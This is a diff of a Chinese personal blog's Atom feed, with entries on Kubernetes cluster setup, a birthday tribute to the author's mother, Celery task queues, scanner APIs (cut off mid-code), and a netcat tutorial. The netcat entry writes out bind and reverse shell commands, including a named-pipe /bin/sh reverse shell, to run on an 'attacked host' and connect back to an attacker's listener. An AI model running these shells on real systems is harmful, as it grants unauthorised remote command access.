-<h3 id="在master主机上，启动服务"><a href="#在master主机上，启动服务" class="headerlink" title="在master主机上，启动服务"></a>在master主机上，启动服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for SERVICES in etcd kube-apiserver kube-controller-manager kube-scheduler; do</div><div class="line">    systemctl restart $SERVICES</div><div class="line">    systemctl enable $SERVICES</div><div class="line">    systemctl status $SERVICES</div><div class="line">done</div></pre></td></tr></table></figure>
-<h2 id="slave节点配置"><a href="#slave节点配置" class="headerlink" title="slave节点配置"></a>slave节点配置</h2><p>yum 安装kubernetes<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install  kubernetes flannel</div></pre></td></tr></table></figure></p>
-<h3 id="slave-配置文件修改"><a href="#slave-配置文件修改" class="headerlink" title="slave 配置文件修改"></a>slave 配置文件修改</h3><h4 id="一-修改kubernetes配置文件，指定master"><a href="#一-修改kubernetes配置文件，指定master" class="headerlink" title="一 .修改kubernetes配置文件，指定master"></a>一 .修改kubernetes配置文件，指定master</h4><p>/etc/kubernetes/config</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-2181a58f95b1164b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h4 id="二-配置kubelet服务"><a href="#二-配置kubelet服务" class="headerlink" title="二  配置kubelet服务"></a>二  配置kubelet服务</h4><p> /etc/kubernetes/kubelet</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-5d1fb93275d32ac5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<h3 id="在slave主机上，启动服务"><a href="#在slave主机上，启动服务" class="headerlink" title="在slave主机上，启动服务"></a>在slave主机上，启动服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for SERVICES in kube-proxy kubelet docker flanneld; do</div><div class="line">    systemctl restart $SERVICES</div><div class="line">    systemctl enable $SERVICES</div><div class="line">    systemctl status $SERVICES</div><div class="line">done</div></pre></td></tr></table></figure>
-<p>###验证</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-f8344025c3bc9b20.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-]]></content>
     
     <summary type="html">
     
@@ -465,26 +210,51 @@
   </entry>
   
   <entry>
+    <title>nc的高级用法</title>
+    <link href="http://yoursite.com/2018/05/30/nc%20%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
+    <id>http://yoursite.com/2018/05/30/nc 的高级用法/</id>
+    <published>2018-05-30T07:50:31.000Z</published>
+    <updated>2018-05-30T07:50:31.000Z</updated>
+    
+    <summary type="html">
+    
+      &lt;ul&gt;
+&lt;li&gt;使用telnet连接服务器&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在被攻击主机上开启监听服务&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;远程主机运行 
+nc -l -p port -t -e cmd.exe (-t:以telnet形式连接 -e:程序定向)
+
+本地机器上直接连接telnet 连接：
+
+telnet  ip  -p
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;让远程主机主动连接本地机器&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Sell中执行:nc路径 -vv 本机ip（链接者的IP不是服务器的ip ） 端口 -e cmd路径
+
+首先本地监听 nc -vv -l -p 8080
+
+-l：监听端口，监听入站信息-p：后跟本地端口号-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信
+&lt;/code&gt;&lt;/pre&gt;&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;http://music.163.com/outchain/player?type=2&amp;id=25706282&amp;auto=0&amp;height=66&quot;&gt;&lt;br&gt;&lt;/iframe&gt;
+    
+    </summary>
+    
+      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
+    
+      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
+    
+      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
+  
+  <entry>
     <title>妈妈生日快乐</title>
     <link href="http://yoursite.com/2018/05/30/mother/"/>
     <id>http://yoursite.com/2018/05/30/mother/</id>
     <published>2018-05-30T07:50:31.000Z</published>
     <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/3941016-893e99aa7b8b04d7.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="WechatIMG299.jpeg"></p>
-<blockquote>
-<p>世界上如果选择一个最爱你的人那一定是你的妈妈</p>
-</blockquote>
-<a id="more"></a>
-<h1 id="小时候"><a href="#小时候" class="headerlink" title="小时候"></a>小时候</h1><p>一直觉得自己不会长大，永远待在父母的身边，记得小时候如果过生日再怎么淘气，你也不会打我，嘿嘿，在你眼中我是个永远长不大的小屁孩，惹你生气，记得初中的时候第一次住在学校，一个星期后回家，第一件事你对着我说，瘦了，没吃饱吧。其实我也很想家。<br><img src="http://upload-images.jianshu.io/upload_images/3941016-ad773803ba51d297.jpeg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="WechatIMG97.jpeg"></p>
-<h1 id="真的有心灵感应"><a href="#真的有心灵感应" class="headerlink" title="真的有心灵感应"></a>真的有心灵感应</h1><p>原谅我，忘记了你生日是什么时候，记得大学的时候，有次和朋友一起外出玩，心里一直在想着你，我不知道为什么。可能发生了什么事，我打个电话给你，才知道今天是你生日，原谅我不孝，没把你的生日记在心里。可能那时候你是多么的想让我打个电话，让我也感应到了。</p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="520" height="86" src="//music.163.com/outchain/player?type=2&id=177578&auto=1&height=66"></iframe>
-
-
-<h1 id="2017-杭州"><a href="#2017-杭州" class="headerlink" title="2017-杭州"></a>2017-杭州</h1><p>越来越大，离家乡越来越远，可能我们这代就这样，小时候哥哥那么小就一个人去深圳拼搏，现在才知道那时候他是多么的艰难，都离开了你身边，连你的生日都是你一个人过得，上周给你打电话，你说生日那天不要打电话给你了，省点电话费，我当时真的不知道说什么，我希望下个你的生日我陪在你的身边。</p>
-<p>#也许</p>
-<p>也许这世间有很多伟大的事，伟大的人，但在我眼里你最是伟大的，妈妈生日快乐，哪怕你看不到，永远健康，献给我最亲爱的妈妈。</p>
-]]></content>
     
     <summary type="html">
     
@@ -503,281 +273,11 @@
   </entry>
   
   <entry>
-    <title>nc的高级用法</title>
-    <link href="http://yoursite.com/2018/05/30/nc%20%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95/"/>
-    <id>http://yoursite.com/2018/05/30/nc 的高级用法/</id>
-    <published>2018-05-30T07:50:31.000Z</published>
-    <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<ul>
-<li>使用telnet连接服务器</li>
-</ul>
-<p>在被攻击主机上开启监听服务</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">远程主机运行 </div><div class="line">nc -l -p port -t -e cmd.exe (-t:以telnet形式连接 -e:程序定向)</div><div class="line"></div><div class="line">本地机器上直接连接telnet 连接：</div><div class="line"></div><div class="line">telnet  ip  -p</div></pre></td></tr></table></figure>
-<p>让远程主机主动连接本地机器<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Sell中执行:nc路径 -vv 本机ip（链接者的IP不是服务器的ip ） 端口 -e cmd路径</div><div class="line"></div><div class="line">首先本地监听 nc -vv -l -p 8080</div><div class="line"></div><div class="line">-l：监听端口，监听入站信息-p：后跟本地端口号-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信</div></pre></td></tr></table></figure></p>
-<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="http://music.163.com/outchain/player?type=2&id=25706282&auto=0&height=66"><br></iframe> 
-
-<a id="more"></a>
-<h1 id="关于Linux下面的用法："><a href="#关于Linux下面的用法：" class="headerlink" title="关于Linux下面的用法："></a>关于Linux下面的用法：</h1><p>因为Linux下面nc 没有  -e 的选项，处于安全考虑</p>
-<h1 id="Linux用创建管道代替-e-选项"><a href="#Linux用创建管道代替-e-选项" class="headerlink" title="Linux用创建管道代替-e 选项"></a>Linux用创建管道代替-e 选项</h1><ul>
-<li><p>在服务器1上（被攻击的机器）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@bt:~#mknod /tmp/backpipe p</div><div class="line">root@bt:~#/bin/sh 0&lt;/tmp/backpipe | nc   服务器2的IP（攻击机的ip）listenport 1&gt;/tmp/backpipe</div></pre></td></tr></table></figure>
-</li>
-<li><p>在服务器2上监听：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc  -lvnp  端口</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<h1 id="nc-实现聊天"><a href="#nc-实现聊天" class="headerlink" title="nc  实现聊天"></a>nc  实现聊天</h1><ul>
-<li>说明主机为Linux服务， 服务器和客户端都是同一台主机</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">在服务器上运行：</div><div class="line"></div><div class="line">nc  -l -p  65533</div><div class="line"></div><div class="line">客户端上运行：</div><div class="line"></div><div class="line"></div><div class="line">nc  服务器地址（127.0.0.1） 服务器端口号如（65535）</div></pre></td></tr></table></figure>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;使用telnet连接服务器&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;在被攻击主机上开启监听服务&lt;/p&gt;
-&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;远程主机运行 &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;nc -l -p port -t -e cmd.exe (-t:以telnet形式连接 -e:程序定向)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;本地机器上直接连接telnet 连接：&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;telnet  ip  -p&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;让远程主机主动连接本地机器&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Sell中执行:nc路径 -vv 本机ip（链接者的IP不是服务器的ip ） 端口 -e cmd路径&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;首先本地监听 nc -vv -l -p 8080&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;-l：监听端口，监听入站信息-p：后跟本地端口号-v：显示端口的信息，如果使用-vv的话，则会显示端口更详细的信&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;iframe frameborder=&quot;no&quot; border=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot; width=&quot;330&quot; height=&quot;86&quot; src=&quot;http://music.163.com/outchain/player?type=2&amp;id=25706282&amp;auto=0&amp;height=66&quot;&gt;&lt;br&gt;&lt;/iframe&gt;
-    
-    </summary>
-    
-      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
-    
-      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
-    
-      <category term="安全" scheme="http://yoursite.com/tags/%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>python中的任务队列</title>
-    <link href="http://yoursite.com/2018/05/30/python-task-ququ22e/"/>
-    <id>http://yoursite.com/2018/05/30/python-task-ququ22e/</id>
-    <published>2018-05-30T07:50:31.000Z</published>
-    <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<ul>
-<li>为什么要做任务队列</li>
-</ul>
-<p>要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。</p>
-<a id="more"></a>
-<ul>
-<li><p>任务队列的意义：</p>
-<p>打个比方如果出现人的速度跟不上机器速度怎么办，这个时候我们就需要第三方，监管人员（任务队列）把机器生产的东西，放在一个地方，（队列），然后分配给每个用户，有条不理的执行。</p>
-</li>
-</ul>
-<blockquote>
-<p> python 里面的celery  模块是一个简单，灵活且可靠的，处理大量消息的分布式系统，并且提供维护这样一个系统的必需工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。</p>
-</blockquote>
-<ul>
-<li>关于安装celery</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip  install Celery</div></pre></td></tr></table></figure>
-<h1 id="关于celery-的概念介绍"><a href="#关于celery-的概念介绍" class="headerlink" title="关于celery 的概念介绍"></a>关于celery 的概念介绍</h1><p><strong>消息队列</strong><br>消息队列的输入是工作的一个单元，称为任务，独立的职程（Worker）进程持续监视队列中是否有需要处理的新任务。<br>Celery 用消息通信，通常使用中间人（Broker）在客户端和职程间斡旋。这个过程从客户端向队列添加消息开始，之后中间人把消息派送给职程，职程对消息进行处理。如下图所示：<br> <img src="http://upload-images.jianshu.io/upload_images/3941016-00078436898975e0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>Celery 系统可包含多个职程和中间人，以此获得高可用性和横向扩展能力。<br><strong>Celery**</strong>的架构<strong><br>Celery的架构由三部分组成，消息中间件（message broker），任务执行单元（worker）和任务执行结果存储（task result store）组成。
-</strong>消息中间件<strong><br>Celery本身不提供消息服务，但是可以方便的和第三方提供的消息中间件集成，包括，<a href="http://rabbitmq.com/" target="_blank" rel="external">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="external">Redis</a>,<a href="http://mongodb.org/" target="_blank" rel="external">MongoDB</a>等，这里我先去了解<a href="http://rabbitmq.com/" target="_blank" rel="external">RabbitMQ</a>,<a href="http://redis.io/" target="_blank" rel="external">Redis</a>。
-</strong>任务执行单元<strong><br>Worker是Celery提供的任务执行的单元，worker并发的运行在分布式的系统节点中
-</strong>任务结果存储**<br>Task result store用来存储Worker执行的任务的结果，Celery支持以不同方式存储任务的结果，包括Redis，MongoDB，Django ORM，AMQP等，这里我先不去看它是如何存储的，就先选用Redis来存储任务执行结果。</p>
-<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p> 环境</p>
-<ul>
-<li>kaillinux  主机两台（192.168.29.234，192.168.29.198）</li>
-<li>redis   (192.168.29.234 )</li>
-<li>flower (192.168.29.234)</li>
-<li>任务脚本（两台都必须部署）</li>
-</ul>
-<p>任务脚本</p>
-<ul>
-<li>tasks.py  (计算加减乘除)</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line">import sys</div><div class="line">import datetime</div><div class="line">BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</div><div class="line">sys.path.append(BASE_DIR)</div><div class="line">from celery import Celery</div><div class="line">from celery import chain, group, chord, Task</div><div class="line">import celeryconfig</div><div class="line">app = Celery()</div><div class="line">app.config_from_object(celeryconfig)</div><div class="line">__all__ = [&apos;add&apos;, &apos;reduce&apos;,&apos;sum_all&apos;, &apos;other&apos;]</div><div class="line">####################################</div><div class="line"># tas #</div><div class="line">####################################</div><div class="line">@app.task</div><div class="line">def add(x, y):</div><div class="line">    return x + y</div><div class="line">@app.task</div><div class="line">def reduce(x, y):</div><div class="line">    return x - y</div><div class="line">@app.task</div><div class="line">def sum(values):</div><div class="line">    return sum([int(value) for value in values])</div><div class="line">@app.task</div><div class="line">def other(x, y):</div><div class="line">    return x * y</div></pre></td></tr></table></figure>
-<ul>
-<li>celeryconfig.py</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">!/usr/bin/python</div><div class="line">#coding:utf-8</div><div class="line">from kombu import Queue</div><div class="line">CELERY_TIMEZONE = &apos;Asia/Shanghai&apos;</div><div class="line">####################################</div><div class="line"># 一般配置 #</div><div class="line">####################################</div><div class="line">CELERY_TASK_SERIALIZER = &apos;json&apos;</div><div class="line">CELERY_RESULT_SERIALIZER = &apos;json&apos;</div><div class="line">CELERY_ACCEPT_CONTENT=[&apos;json&apos;]</div><div class="line">CELERY_TIMEZONE = &apos;Asia/Shanghai&apos;</div><div class="line">CELERY_ENABLE_UTC = True</div><div class="line"># List of modules to import when celery starts.</div><div class="line">CELERY_IMPORTS = (&apos;tasks&apos;, )</div><div class="line">CELERYD_MAX_TASKS_PER_CHILD = 40 #  每个worker执行了多少任务就会死掉</div><div class="line">BROKER_POOL_LIMIT = 10 #默认celery与broker连接池连接数</div><div class="line">CELERY_DEFAULT_QUEUE=&apos;default&apos;</div><div class="line">CELERY_DEFAULT_ROUTING_KEY=&apos;task.default&apos;</div><div class="line">CELERY_RESULT_BACKEND=&apos;redis://192.168.29.234:6379/0&apos;  </div><div class="line">BROKER_URL=&apos;redis://192.168.29.234:6379/0&apos;  </div><div class="line">#默认队列</div><div class="line">CELERY_DEFAULT_QUEUE = &apos;celery&apos;</div><div class="line">CELERY_DEFAULT_ROUTING_KEY = &apos;celery&apos;</div><div class="line">CELERYD_LOG_FILE=&quot;./logs/celery.log&quot;</div><div class="line">CELERY_QUEUEs = (</div><div class="line">    Queue(&quot;queue_add&quot;, routing_key=&apos;queue_add&apos;),</div><div class="line">    Queue(&apos;queue_reduce&apos;, routing_key=&apos;queue_sum&apos;),</div><div class="line">    Queue(&apos;celery&apos;, routing_key=&apos;celery&apos;),</div><div class="line">    )</div><div class="line">CELERY_ROUTES = &#123;</div><div class="line">    &apos;task.add&apos;:&#123;&apos;queue&apos;:&apos;queue_add&apos;, &apos;routing_key&apos;:&apos;queue_add&apos;&#125;,</div><div class="line">    &apos;task.reduce&apos;:&#123;&apos;queue&apos;:&apos;queue_reduce&apos;, &apos;routing_key&apos;:&apos;queue_sum&apos;&#125;,</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h1 id="关于flower是监控任务信息的web-图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower-文件"><a href="#关于flower是监控任务信息的web-图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower-文件" class="headerlink" title="关于flower是监控任务信息的web 图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower 文件"></a>关于flower是监控任务信息的web 图表，默认的配置没有做验证，而且当主机重启时，数据会丢失，所以我们要自定义一个flower 文件</h1><p><a href="https://github.com/mher/flower" target="_blank" rel="external">flower github</a></p>
-<p>在234 上flower.py 的脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line">#coding:utf-8</div><div class="line">broker_api = &apos;redis://127.0.0.1:6379/0&apos;</div><div class="line">logging = &apos;DEBUG&apos;</div><div class="line">address = &apos;0.0.0.0&apos;</div><div class="line">port = 5555</div><div class="line">#外部访问密码</div><div class="line">#basic_auth=[&apos;root:ybl8651073&apos;]</div><div class="line">persistent=True  #持久化celery tasks（如果为false的话，重启flower之后，监控的task就消失了)</div><div class="line">db=&quot;/root/flower_db&quot;</div></pre></td></tr></table></figure>
-<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><ul>
-<li><p>在198上启动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">celery worker -A  tasks --loglevel=info --queues=celery,queue_add --hostname=celery_worker198</div></pre></td></tr></table></figure>
-</li>
-<li><p>在234 上启动</p>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  redis服务</div><div class="line">2.  celery worker -A  tasks --loglevel=info --queues=celery,queue_reduce --hostname=celery_worker234</div><div class="line">3.  celery  flower worker -A  tasks  --config==/root/flower.py</div></pre></td></tr></table></figure>
-<h1 id="服务器验证"><a href="#服务器验证" class="headerlink" title="服务器验证"></a>服务器验证</h1><ul>
-<li>在任一台有celeryservice项目代码的服务器上，运行add、reduce、-</li>
-<li>sum、other任务（测试可简单使用add.delay(1,2)等）</li>
-<li>add只会在198上运行，</li>
-<li>sum任务，可能会在198或234服务器的worker节点运行</li>
-<li>reduce任务,只会在234上运行。</li>
-<li>other任务可能会在198或者234上运行。</li>
-</ul>
-<h1 id="打开监控web-192-168-29-234-5555"><a href="#打开监控web-192-168-29-234-5555" class="headerlink" title="打开监控web 192.168.29.234:5555"></a>打开监控web 192.168.29.234:5555</h1><p><img src="http://upload-images.jianshu.io/upload_images/3941016-3fb477a9ac403fba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=" 两台上线workers"></p>
-<ul>
-<li>随机运行几个任务</li>
-</ul>
-<p><img src="http://upload-images.jianshu.io/upload_images/3941016-91d2a6b25d0eeba9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
-<ul>
-<li>分析<br><img src="http://upload-images.jianshu.io/upload_images/3941016-d8248fb57d9ac788.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="运行结果"></li>
-</ul>
-<ul>
-<li>也可以通过 curl提交任务<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -X POST -d &apos;&#123;&quot;args&quot;:[1,2]&#125;&apos; http://192.168.29.234:5555/api/task/async-apply/tasks.add</div></pre></td></tr></table></figure>
-</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;ul&gt;
-&lt;li&gt;为什么要做任务队列&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;要回答这个问题我们首先看看在流水线上的案列，如果人的速度很慢，机器的速度比人的速度快很多，就会造成，机器生产的东西没有及时处理，越积越多，造成阻塞，影响生产。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="django任务队列" scheme="http://yoursite.com/categories/django%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97/"/>
-    
-    
-      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
-    
-      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
-    
-      <category term="django" scheme="http://yoursite.com/tags/django/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>nessus与awvs API</title>
-    <link href="http://yoursite.com/2018/05/30/scan/"/>
-    <id>http://yoursite.com/2018/05/30/scan/</id>
-    <published>2018-05-30T07:50:31.000Z</published>
-    <updated>2018-05-30T07:50:31.000Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://upload-images.jianshu.io/upload_images/3941016-beb5143ed978f26e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="nessus.jpg"></p>
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 最近在做自动化安全扫描器开发，在项目中想引用比较知名的扫描器，如是整理了一下API作为参考</p>
-<a id="more"></a>
-<h1 id="Nessus-6-x版本"><a href="#Nessus-6-x版本" class="headerlink" title=" Nessus 6.x版本"></a><font color="#C71585" size="4" face="黑体"> Nessus 6.x版本</font></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div 